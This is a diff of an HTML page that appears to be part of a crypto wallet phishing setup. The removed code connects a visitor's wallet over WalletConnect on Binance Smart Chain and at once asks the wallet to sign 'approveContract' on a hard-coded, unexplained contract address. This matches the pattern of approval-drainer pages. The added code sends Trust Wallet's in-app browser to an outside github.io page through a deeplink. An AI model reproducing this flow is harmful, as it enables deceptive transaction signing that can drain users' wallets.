@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WalletConnect Integration</title>
+    <title>Trust Wallet Integration via Deeplink</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -41,56 +41,16 @@
 </head>
 <body>
     <div id="app">
-        <h1>WalletConnect Integration</h1>
-        <button onclick="connectWallet()">Подключить кошелек</button>
+        <h1>Trust Wallet Integration via Deeplink</h1>
+        <button onclick="openTrustWallet()">Открыть Trust Wallet</button>
         <div id="status"></div>
         <div id="error"></div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
-
     <script>
-        async function connectWallet() {
-            try {
-                const provider = new WalletConnectProvider.default({
-                    rpc: {
-                        56: "https://bsc-dataseed.binance.org/" // Binance Smart Chain
-                    },
-                });
-
-                // Включаем WalletConnect
-                await provider.enable();
-
-                // Создаем провайдер для ethers.js
-                const web3Provider = new ethers.providers.Web3Provider(provider);
-
-                // Получаем адрес пользователя
-                const signer = web3Provider.getSigner();
-                const userAddress = await signer.getAddress();
-
-                document.getElementById("status").innerText = `Кошелек подключен: ${userAddress}`;
-
-                // Подписание контракта
-                await signContract(web3Provider);
-
-            } catch (error) {
-                document.getElementById("error").innerText = `Ошибка: ${error.message}`;
-            }
-        }
-
-        async function signContract(provider) {
-            const signer = provider.getSigner();
-            const contractAbi = [
-                "function approveContract() external"
-            ];
-            const contractAddress = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e";
-            const contract = new ethers.Contract(contractAddress, contractAbi, signer);
-
-            const tx = await contract.approveContract();
-            console.log("Контракт подписан. Транзакция:", tx.hash);
-            await tx.wait();
-            document.getElementById("status").innerText = "Контракт успешно подписан.";
+        function openTrustWallet() {
+            const deeplink = "trust://browser_redirect?url=https://sorex1992.github.io/github.io/";
+            window.location.href = deeplink;
         }
     </script>
 </body>
